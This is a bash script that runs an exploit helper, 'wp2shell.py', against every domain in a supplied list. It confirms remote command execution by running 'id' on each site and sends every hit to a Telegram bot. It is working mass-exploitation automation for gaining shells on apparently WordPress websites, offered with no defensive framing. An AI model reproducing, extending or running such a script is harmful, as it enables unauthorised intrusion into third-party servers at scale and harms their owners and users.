#!/usr/bin/env bash
# batch-scan.sh — test actual RCE shell with "id"

TG_TOKEN="${TG_TOKEN:-}"
TG_CHAT_ID="${TG_CHAT_ID:-}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RESULTS_DIR="$SCRIPT_DIR/results"
mkdir -p "$RESULTS_DIR"

> "$RESULTS_DIR/confirmed.txt"
> "$RESULTS_DIR/not-vuln.txt"

[[ $# -lt 1 ]] && { echo "Usage: $0 domains.txt"; exit 1; }

while IFS= read -r domain || [[ -n "$domain" ]]; do
  domain="${domain%%#*}"
  domain="${domain#"${domain%%[![:space:]]*}"}"
  domain="${domain%"${domain##*[![:space:]]}"}"
  [[ -z "$domain" ]] && continue

  echo -n "$domain... "

  result=$(python3 "$SCRIPT_DIR/wp2shell.py" shell "https://$domain" --cmd "id" 2>&1)

  if echo "$result" | grep -q "uid="; then
    echo "🔴 SHELL WORKS"
    echo "$domain | $result" >> "$RESULTS_DIR/confirmed.txt"
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
      -d chat_id="$TG_CHAT_ID" \
      -d text="🔴 SHELL — $domain
$result" > /dev/null 2>&1
  else
    echo "⚪ skip"
    echo "$domain" >> "$RESULTS_DIR/not-vuln.txt"
  fi
done < "$1"

echo ""
echo "Shell confirmed: $(wc -l < "$RESULTS_DIR/confirmed.txt")"
echo "No shell: $(wc -l < "$RESULTS_DIR/not-vuln.txt")"
